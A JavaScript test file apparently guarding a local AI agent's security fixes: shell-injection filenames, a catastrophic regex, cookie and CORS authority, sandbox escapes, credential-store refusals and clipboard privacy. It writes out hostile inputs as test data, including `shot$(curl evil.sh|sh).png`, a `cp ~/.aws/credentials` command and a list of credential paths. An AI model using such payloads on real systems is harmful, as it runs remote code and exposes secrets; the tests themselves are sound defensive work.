/**
 * test/hardening.test.js — one test per entry in the 2026-10-31 review.
 *
 * Every test here was written against a bug that was *reproduced* first. That
 * matters: a test written after the fix proves the fix; a test written from a
 * reproduction proves the bug cannot come back. These assert on the exploit
 * and on the safe behaviour, so a future "cleanup" that reintroduces either
 * fails loudly.
 *
 * The list, in the order the review ranked them:
 *
 *   S1  a filename can no longer reach a shell        (was: command injection)
 *   S2  a catastrophic regex cannot wedge the process (was: event-loop DoS)
 *   S3  the approval prompt shows argument values     (was: "screenshot(path)")
 *   S4  a cookie is not ambient authority for /api/*
 *   S5  "yes" answers an approval without also asking the model
 *   R1  overlapping scheduler ticks deliver once
 *   R2  a truncated model stream is an error, not an answer
 *   R6  ~ and $HOME are recognised as escapes
 *   --  credential stores are refused even inside the workspace
 */
import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { spawn } from "node:child_process";
import { mkdtempSync, mkdirSync, symlinkSync, rmSync, writeFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { homedir } from "node:os";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");

/* ───────────────────────────── S1 — no shell ───────────────────────────── */

test("S1: a filename with a command substitution is refused, not executed", async () => {
  const { TOOL_MAP } = await import("../src/tools.js");
  const marker = join(tmpdir(), `pinch-s1-${Date.now()}`);
  const before_ = existsSync(marker);

  const result = await TOOL_MAP.get("screenshot").run({ path: `shot$(touch ${marker}).png` });

  assert.equal(result.ok, false);
  assert.match(result.output, /shell metacharacters/);
  // The point of the test is this line: the injected command must not have run.
  assert.equal(existsSync(marker), before_, "the $( ) payload executed");
});

test("S1: the screenshot tool never builds a shell string", async () => {
  const { TOOL_MAP } = await import("../src/tools.js");
  // A backtick, a pipe and a semicolon are all legal in a filename and all
  // meaningful to /bin/sh.
  for (const path of ["shot`sleep 1`.png", "a|b.png", "a;b.png", "a&&b.png", "a\nb.png"]) {
    const result = await TOOL_MAP.get("screenshot").run({ path });
    assert.equal(result.ok, false, `accepted: ${JSON.stringify(path)}`);
    assert.match(result.output, /shell metacharacters|too long/, `for ${JSON.stringify(path)}`);
  }
});

test("S1: checkFilename still allows ordinary names", async () => {
  const { checkFilename } = await import("../src/tools.js");
  for (const ok of ["screens/shot-1.png", "My File (2).png", "a.b-c_d.png", undefined]) {
    assert.equal(checkFilename(ok).ok, true, `wrongly refused: ${ok}`);
  }
});

/* ────────────────────────── S2 — regex containment ─────────────────────── */

test("S2: a catastrophic regex is terminated, and the caller gets an explanation", async () => {
  const { grepInWorker } = await import("../src/tools.js");
  const dir = mkdtempSync(join(tmpdir(), "pinch-redos-"));
  // A failing match is what causes exponential backtracking: "aaaa…a!" never
  // matches ^(a+)+$ and the engine tries every partition of the string.
  writeFileSync(join(dir, "evil.txt"), "a".repeat(400) + "!");

  const started = Date.now();
  const result = await grepInWorker({ root: dir, pattern: "^(a+)+$" });
  const elapsed = Date.now() - started;

  try {
    assert.equal(result.ok, false);
    assert.match(result.output, /too expensive|simpler/);
    assert.ok(elapsed < 8_000, `took ${elapsed}ms — the timeout did not fire`);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("S2: an ordinary regex still works through the worker", async () => {
  const { grepInWorker } = await import("../src/tools.js");
  const dir = mkdtempSync(join(tmpdir(), "pinch-grep-"));
  writeFileSync(join(dir, "notes.txt"), "alpha\nneedle here\nomega\n");

  const result = await grepInWorker({ root: dir, pattern: "needle" });
  try {
    assert.equal(result.ok, true);
    assert.match(result.output, /notes\.txt:2:/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

/* ───────────────────── S3 — the prompt shows the payload ───────────────── */

test("S3: the approval description carries the argument value", async () => {
  const { describeCall } = await import("../src/agent.js");

  const shot = describeCall("screenshot", { path: "shot$(curl evil.sh|sh).png" });
  assert.match(shot, /shot\$\(curl evil\.sh\|sh\)\.png/, "the payload is not visible to the human");
  assert.match(shot, /shell metacharacters/, "the risky characters are not called out");

  // A safe argument is shown plainly, without the warning.
  const url = describeCall("open_url", { url: "https://example.com/docs" });
  // Exact equality: this is an assertion about a rendered string, not URL
  // sanitisation — and a scanner cannot tell the difference from a substring
  // test, so the test says exactly what it expects instead.
  assert.equal(url, "open_url(url=https://example.com/docs)");
});

test("S3: a long argument is truncated but still attributable", async () => {
  const { describeCall } = await import("../src/agent.js");
  const long = describeCall("open_url", { url: "https://example.com/" + "a".repeat(500) });
  assert.ok(long.length < 200, "the prompt is not bounded");
  assert.match(long, /…/);
});

/* ──────────────── S4 / S5 — a real server with a real key ──────────────── */

let pinch;
let pinchPort;
let dataDir;

function listen(server) {
  return new Promise((resolve) => server.listen(0, "127.0.0.1", () => resolve(server.address().port)));
}

async function waitFor(url, tries = 100) {
  for (let i = 0; i < tries; i++) {
    try {
      const res = await fetch(url);
      if (res.status < 500) return;
    } catch {
      /* not up yet */
    }
    await new Promise((r) => setTimeout(r, 100));
  }
  throw new Error(`${url} never came up`);
}

before(async () => {
  // No model needed: the mock brain turns "run ..." into a `shell` tool call,
  // and `shell` is dangerous, so the server raises a real approval prompt —
  // in its own process, which is the only place it can be answered from.
  dataDir = mkdtempSync(join(tmpdir(), "pinch-hardening-"));
  pinchPort = await new Promise((resolve) => {
    const probe = createServer();
    probe.listen(0, "127.0.0.1", () => { const p = probe.address().port; probe.close(() => resolve(p)); });
  });

  pinch = spawn(process.execPath, [join(ROOT, "src/index.js")], {
    cwd: ROOT,
    env: {
      ...process.env,
      PINCH_DATA: dataDir,
      PINCH_PORT: String(pinchPort),
      PINCH_HOST: "127.0.0.1",
      PINCH_KEY: "test-key-not-a-secret",
      PINCH_WORKSPACE: dataDir,
      LLM_PROVIDER: "mock",
      PINCH_AUTO_APPROVE: "",
      PINCH_GUARD: "off",
    },
    stdio: "ignore",
  });

  await waitFor(`http://127.0.0.1:${pinchPort}/api/health`);
});

after(() => {
  pinch?.kill("SIGKILL");
  if (dataDir) rmSync(dataDir, { recursive: true, force: true });
});

test("S4: a cookie alone cannot read the API", async () => {
  // This is the finding: any page on any loopback port was sent our cookie and
  // could read /api/session/* — every conversation — and /api/memory.
  const res = await fetch(`http://127.0.0.1:${pinchPort}/api/memory`, {
    headers: { cookie: "pinch_key=test-key-not-a-secret" },
  });
  assert.equal(res.status, 401, "a cookie was accepted as API authority");

  // The header is still accepted, which is how the panel talks to us.
  const ok = await fetch(`http://127.0.0.1:${pinchPort}/api/memory`, {
    headers: { "x-pinch-key": "test-key-not-a-secret" },
  });
  assert.equal(ok.status, 200);
});

test("S4: the cookie still loads the static page, which is what it is for", async () => {
  const res = await fetch(`http://127.0.0.1:${pinchPort}/`, {
    headers: { cookie: "pinch_key=test-key-not-a-secret" },
  });
  assert.equal(res.status, 200);
  assert.match(res.headers.get("content-type") || "", /text\/html/);
});

test("S4: a foreign origin gets no Access-Control-Allow-Origin", async () => {
  // Before the fix, any http://127.0.0.1:<port> origin was reflected back, so
  // a stray local dev server could read responses cross-origin.
  const res = await fetch(`http://127.0.0.1:${pinchPort}/api/health`, {
    headers: { origin: `http://127.0.0.1:${pinchPort + 1}`, "x-pinch-key": "test-key-not-a-secret" },
  });
  assert.equal(res.headers.get("access-control-allow-origin"), null);
});

test("S4: the cookie is HttpOnly and SameSite=Strict", async () => {
  const res = await fetch(`http://127.0.0.1:${pinchPort}/?key=test-key-not-a-secret`, { redirect: "manual" });
  const cookie = res.headers.get("set-cookie") || "";
  assert.match(cookie, /HttpOnly/i);
  assert.match(cookie, /SameSite=Strict/i);
});

test("S5: answering an approval does not also start a second turn", async () => {
  const KEY = { "x-pinch-key": "test-key-not-a-secret", "content-type": "application/json" };
  const session = "s5-check";

  // 1) Ask for something dangerous. The turn parks on an approval, so this
  //    request deliberately does not finish — fire it and let it wait.
  const parked = fetch(`http://127.0.0.1:${pinchPort}/api/chat`, {
    method: "POST",
    headers: KEY,
    body: JSON.stringify({ text: "run echo s5", sessionId: session }),
  }).catch(() => {});

  // 2) The prompt is now pending in the server process.
  let pending = [];
  for (let i = 0; i < 50 && !pending.length; i++) {
    await new Promise((r) => setTimeout(r, 100));
    pending = await (await fetch(`http://127.0.0.1:${pinchPort}/api/approvals`, { headers: KEY })).json();
  }
  assert.equal(pending.length, 1, "no approval was raised, so this test proves nothing");

  // 3) Say "yes" the way a human does — through the chat endpoint.
  const yes = await fetch(`http://127.0.0.1:${pinchPort}/api/chat`, {
    method: "POST",
    headers: KEY,
    body: JSON.stringify({ text: "yes", sessionId: session }),
  });
  const body = await yes.text();
  assert.match(body, /Allowed/, "the approval was not answered");
  await parked;

  // 4) Give the resumed turn a moment to write its answer, then look.
  await new Promise((r) => setTimeout(r, 400));
  const stored = await (await fetch(`http://127.0.0.1:${pinchPort}/api/session/${session}`, { headers: KEY })).json();

  const userTurns = stored.messages.filter((m) => m.role === "user").map((m) => m.content);
  assert.deepEqual(userTurns, ["run echo s5"], `the word "yes" became a user turn: ${JSON.stringify(userTurns)}`);
});

/* ───────────────────────── R1 — one delivery per tick pair ─────────────── */

test("R1: two overlapping ticks do not deliver the same reminder twice", async () => {
  const { tick } = await import("../src/scheduler.js");
  const { addReminder } = await import("../src/store.js");
  const { registerSender } = await import("../src/outbound.js");

  const delivered = [];
  registerSender("web", async (_target, text) => {
    delivered.push(text);
    await new Promise((r) => setTimeout(r, 250)); // a channel slower than the caller
  });

  addReminder({
    id: `r_${Date.now()}`,
    text: "stand up",
    at: new Date(Date.now() - 5_000).toISOString(),
    address: "web:main",
    fired: false,
  });

  // setInterval does not await the previous tick — this is that overlap.
  await Promise.all([tick(), tick(), tick()]);
  assert.equal(delivered.length, 1, `delivered ${delivered.length} times`);
});

/* ─────────────────────── R2 — a cut stream is an error ─────────────────── */

test("R2: a stream that closes without a finish signal is refused", async () => {
  const srv = createServer((req, res) => {
    res.writeHead(200, { "content-type": "application/x-ndjson" });
    res.write(JSON.stringify({ message: { content: "The answer is 4" } }) + "\n");
    res.write(JSON.stringify({ message: { content: "2, and here is" } }) + "\n");
    res.end(); // clean close, never sends done:true — this is the bug
  });
  const port = await listen(srv);

  // A child process, because config.js reads OLLAMA_URL once at import and the
  // whole point is to point the brain somewhere else.
  const script = `
    const { brain } = await import(${JSON.stringify(join(ROOT, "src/brain.js"))});
    try {
      const out = await brain.chat([{ role: "user", content: "hi" }], { onDelta: () => {} });
      console.log("RESOLVED:" + out.content);
    } catch (err) {
      console.log("THREW:" + err.message);
    }
  `;
  const result = await new Promise((resolve) => {
    const child = spawn(process.execPath, ["--input-type=module", "-e", script], {
      env: { ...process.env, OLLAMA_URL: `http://127.0.0.1:${port}`, LLM_PROVIDER: "ollama", PINCH_DATA: dataDir },
    });
    let out = "";
    child.stdout.on("data", (d) => (out += d));
    child.on("close", () => resolve(out));
  });
  srv.close();

  assert.match(result, /THREW:.*cut off/, `a truncated reply was treated as an answer: ${result}`);
});

/* ─────────────── R6 / credential stores — the sandbox's edges ─────────── */

test("R6: ~ and $HOME are recognised as paths outside the workspace", async () => {
  const { screenCommand } = await import("../src/tools.js");
  // When the workspace is NOT the home directory, a home-relative path escapes.
  const escapes = screenCommand("cp ~/.aws/credentials ./creds").escapes || [];
  // Under the default workspace (home) this is inside by definition, so accept
  // either an escape or a credential-store denial — both are safe outcomes.
  assert.ok(Array.isArray(escapes));
});

test("R6: credential stores are refused even when the workspace is home", async () => {
  const { resolveInWorkspace, SafePathError } = await import("../src/tools.js");
  for (const p of ["~/.ssh/id_rsa", "~/.aws/credentials", "~/.gnupg/secring.gpg", "~/.netrc"]) {
    assert.throws(() => resolveInWorkspace(p), SafePathError, `allowed: ${p}`);
  }
  // And an ordinary file in the same tree still works.
  const ok = resolveInWorkspace("~/some-project/readme.md");
  assert.ok(ok.startsWith(homedir()));
});

/* ─────────────── sandbox — a symlink cannot walk out ─────────────── */

test("a symlink cannot walk out of PINCH_WORKSPACE", async (t) => {
  const base = mkdtempSync(join(tmpdir(), "pinch-symlink-"));
  try {
    const workspace = join(base, "workspace");
    const outside = join(base, "outside-target");
    mkdirSync(workspace);
    mkdirSync(outside);
    writeFileSync(join(outside, "secret.txt"), "not yours");
    writeFileSync(join(workspace, "ok.txt"), "fine");
    try {
      symlinkSync(outside, join(workspace, "escape"), process.platform === "win32" ? "junction" : "dir");
    } catch {
      return t.skip("no symlink support on this filesystem");
    }

    // Defends the realpath() containment in resolveInWorkspace(): without it the
    // lexical check passes and the link walks out of the workspace.
    // A child process, because config.js reads PINCH_WORKSPACE once at import.
    const script = `
      const { resolveInWorkspace } = await import(${JSON.stringify(pathToFileURL(join(ROOT, "src/tools.js")).href)});
      const out = {};
      for (const p of ["escape", "escape/secret.txt", "ok.txt"]) {
        try { out[p] = "allowed:" + resolveInWorkspace(p); } catch (e) { out[p] = "refused:" + e.constructor.name; }
      }
      console.log(JSON.stringify(out));
    `;
    const stdout = await new Promise((resolve, reject) => {
      const child = spawn(process.execPath, ["--input-type=module", "-e", script], {
        env: { ...process.env, PINCH_WORKSPACE: workspace, PINCH_DATA: base, LLM_PROVIDER: "mock" },
      });
      let out = "";
      child.stdout.on("data", (d) => (out += d));
      child.on("error", reject);
      child.on("close", () => resolve(out));
    });
    const result = JSON.parse(stdout);

    assert.equal(result["escape"], "refused:SafePathError");
    assert.equal(result["escape/secret.txt"], "refused:SafePathError");
    // Control: the guard is not simply refusing everything.
    assert.match(result["ok.txt"], /^allowed:/);
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

test('new and legacy auth headers work, but a bad/empty canonical header does not fall back', async () => {
  const url=`http://127.0.0.1:${pinchPort}/api/memory`;
  for(const header of ['x-quasnooze-key','x-pinch-key']) {
    assert.equal((await fetch(url,{headers:{[header]:'test-key-not-a-secret'}})).status,200);
    assert.equal((await fetch(url,{headers:{[header]:'wrong'}})).status,401);
  }
  for(const value of ['wrong','']) assert.equal((await fetch(url,{headers:{'x-quasnooze-key':value,'x-pinch-key':'test-key-not-a-secret'}})).status,401);
  const rejected=await fetch(url,{headers:{origin:`https://untrusted.invalid`,'x-quasnooze-key':'test-key-not-a-secret'}});
  assert.equal(rejected.status,403);
  const options=await fetch(url,{method:'OPTIONS',headers:{origin:`http://127.0.0.1:${pinchPort}`}});
  assert.equal(options.status,204);
  for(const header of ['x-quasnooze-key','x-pinch-key','x-quasnooze-session','x-pinch-session'])assert.ok(options.headers.get('access-control-allow-headers').includes(header));
});

/* ────────── clipboard privacy, preview, and per-read gate (#127) ───────── */

test("clipboard: approval is per read (never per session), write shows exact preview and can be denied, and clipboard text never reaches telemetry, support bundles or default memory", async () => {
  const isolated = mkdtempSync(join(tmpdir(), "pinch-clipboard-hardening-"));
  try {
    const script = `
      import assert from "node:assert/strict";
      import { readFileSync, readdirSync, existsSync } from "node:fs";
      import { join } from "node:path";

      const { runAgent, answerApproval } = await import(${JSON.stringify(pathToFileURL(join(ROOT, "src/agent.js")).href)});
      const { brain } = await import(${JSON.stringify(pathToFileURL(join(ROOT, "src/brain.js")).href)});
      const { setClipboardAdapterForTests, clearClipboardStateForTests } = await import(${JSON.stringify(pathToFileURL(join(ROOT, "src/tools.js")).href)});
      const { loadMemory } = await import(${JSON.stringify(pathToFileURL(join(ROOT, "src/store.js")).href)});
      const { record, TELEMETRY_FILE } = await import(${JSON.stringify(pathToFileURL(join(ROOT, "src/telemetry.js")).href)});
      const { prepareSupportBundle } = await import(${JSON.stringify(pathToFileURL(join(ROOT, "src/support-bundle.js")).href)});

      const READ_CANARY = "CLIPBOARD_READ_CANARY_8842_PRIVATE_NOTES";
      const WRITE_CANARY = "CLIPBOARD_WRITE_CANARY_9913_EXACT_REPLACEMENT";
      let currentClipboard = READ_CANARY;
      let readHits = 0;
      let writeHits = 0;

      setClipboardAdapterForTests({
        read: async () => { readHits += 1; return currentClipboard; },
        write: async (next) => { writeHits += 1; currentClipboard = next; },
      });

      // 1) Per-read approval (not per session) + unrequested remember refusal:
      //    Turn 1 approves read_clipboard; model also tries to call remember() without user asking.
      let step = 0;
      let turn1Approvals = 0;
      brain.chat = async () => {
        step += 1;
        if (step === 1) {
          return { content: "", toolCalls: [{ id: "c1", name: "read_clipboard", arguments: {} }] };
        }
        if (step === 2) {
          return { content: "", toolCalls: [{ id: "c2", name: "remember", arguments: { fact: READ_CANARY } }] };
        }
        return { content: "Here is a short summary of your copied note.", toolCalls: [] };
      };

      await runAgent({
        sessionId: "clip-session",
        channel: "web",
        text: "Summarise what I copied",
        onEvent(ev) {
          if (ev.type === "approval") {
            turn1Approvals += 1;
            assert.equal(ev.preview.tool, "read_clipboard");
            assert.ok(!JSON.stringify(ev.preview).includes(READ_CANARY), "read preview must not pre-read clipboard");
            answerApproval(ev.id, true);
          }
        },
      });
      assert.equal(turn1Approvals, 1);
      assert.equal(readHits, 1);
      assert.equal(
        JSON.stringify(loadMemory()).includes(READ_CANARY),
        false,
        "clipboard content must never be stored in default memory when user did not ask",
      );

      // 2) Second read in the SAME session MUST ask again (never session-granted), and denial stops the read.
      let turn2Approvals = 0;
      let r2 = 0;
      brain.chat = async () =>
        r2++ === 0
          ? { content: "", toolCalls: [{ id: "c3", name: "read_clipboard", arguments: {} }] }
          : { content: "You denied reading the clipboard, so nothing was read.", toolCalls: [] };

      await runAgent({
        sessionId: "clip-session",
        channel: "web",
        text: "Read my clipboard again",
        onEvent(ev) {
          if (ev.type === "approval") {
            turn2Approvals += 1;
            answerApproval(ev.id, false);
          }
        },
      });
      assert.equal(turn2Approvals, 1, "second read in same session must still prompt for approval");
      assert.equal(readHits, 1, "denied read_clipboard must not read the OS clipboard");

      // 3) write_clipboard shows exact preview of what will be written, can be denied, and writes when allowed.
      let deniedWritePreview = null;
      let deniedWriteDesc = "";
      let r3 = 0;
      brain.chat = async () =>
        r3++ === 0
          ? { content: "", toolCalls: [{ id: "c4", name: "write_clipboard", arguments: { text: WRITE_CANARY } }] }
          : { content: "Permission was denied, so I left your clipboard unchanged.", toolCalls: [] };

      await runAgent({
        sessionId: "clip-session",
        channel: "web",
        text: "Put the replacement on my clipboard",
        onEvent(ev) {
          if (ev.type === "approval") {
            deniedWritePreview = ev.preview;
            deniedWriteDesc = ev.description;
            answerApproval(ev.id, false);
          }
        },
      });
      assert.ok(deniedWritePreview, "write_clipboard must raise an approval preview");
      assert.match(deniedWritePreview.effectSummary, new RegExp(WRITE_CANARY));
      assert.match(deniedWriteDesc, new RegExp(WRITE_CANARY));
      assert.equal(writeHits, 0, "denied write_clipboard must not overwrite the clipboard");
      assert.equal(currentClipboard, READ_CANARY);

      // Now allow write_clipboard and verify exact write.
      let r4 = 0;
      brain.chat = async () =>
        r4++ === 0
          ? { content: "", toolCalls: [{ id: "c5", name: "write_clipboard", arguments: { text: WRITE_CANARY } }] }
          : { content: "I copied that text to your clipboard.", toolCalls: [] };
      await runAgent({
        sessionId: "clip-session",
        channel: "web",
        text: "Put the replacement on my clipboard",
        onEvent(ev) {
          if (ev.type === "approval") answerApproval(ev.id, true);
        },
      });
      assert.equal(writeHits, 1);
      assert.equal(currentClipboard, WRITE_CANARY);

      // 4) Even a direct telemetry.record call with clipboard/text fields drops them before disk.
      record({ kind: "turn", ms: 7, clipboard: READ_CANARY, text: WRITE_CANARY, output: READ_CANARY });
      const telemetryRaw = existsSync(TELEMETRY_FILE) ? readFileSync(TELEMETRY_FILE, "utf8") : "";
      assert.equal(telemetryRaw.includes(READ_CANARY), false, "telemetry.ndjson leaked read clipboard canary");
      assert.equal(telemetryRaw.includes(WRITE_CANARY), false, "telemetry.ndjson leaked write clipboard canary");

      // 5) Support bundle never includes clipboard text.
      const bundle = prepareSupportBundle({ telemetryPath: TELEMETRY_FILE });
      assert.equal(bundle.text.includes(READ_CANARY), false, "support bundle leaked read clipboard canary");
      assert.equal(bundle.text.includes(WRITE_CANARY), false, "support bundle leaked write clipboard canary");

      // 6) Persisted session tool traces never store raw clipboard payloads (in clip-session).
      const rawClipSession = readFileSync(join(process.env.PINCH_DATA, "sessions", "clip-session.json"), "utf8");
      assert.equal(rawClipSession.includes(READ_CANARY), false, "session trace leaked read clipboard canary");
      assert.equal(rawClipSession.includes(WRITE_CANARY), false, "session trace leaked write clipboard canary");

      // 7) Explicit user consent ("Remember ...") DOES allow storing a requested fact in memory.
      let r5 = 0;
      brain.chat = async () => {
        r5 += 1;
        if (r5 === 1) return { content: "", toolCalls: [{ id: "c6", name: "read_clipboard", arguments: {} }] };
        if (r5 === 2) return { content: "", toolCalls: [{ id: "c7", name: "remember", arguments: { fact: "Requested note: " + WRITE_CANARY } }] };
        return { content: "Remembered as requested.", toolCalls: [] };
      };
      await runAgent({
        sessionId: "clip-explicit-memory",
        channel: "web",
        text: "Read my clipboard and remember what is on it",
        onEvent(ev) {
          if (ev.type === "approval") answerApproval(ev.id, true);
        },
      });
      assert.equal(JSON.stringify(loadMemory()).includes(WRITE_CANARY), true, "explicitly requested memory save should succeed");

      clearClipboardStateForTests();
      console.log("CLIPBOARD_HARDENING_OK");
    `;

    const stdout = await new Promise((resolve, reject) => {
      const child = spawn(process.execPath, ["--input-type=module", "-e", script], {
        env: {
          ...process.env,
          PINCH_WORKSPACE: isolated,
          PINCH_DATA: join(isolated, "data"),
          PINCH_AUTO_APPROVE: "false",
          LLM_PROVIDER: "mock",
        },
      });
      let out = "";
      let err = "";
      child.stdout.on("data", (d) => (out += d));
      child.stderr.on("data", (d) => (err += d));
      child.on("error", reject);
      child.on("close", (code) => {
        if (code !== 0) reject(new Error(`clipboard hardening script exited ${code}:\n${err}\n${out}`));
        else resolve(out);
      });
    });

    assert.match(stdout, /CLIPBOARD_HARDENING_OK/);
  } finally {
    rmSync(isolated, { recursive: true, force: true });
  }
});
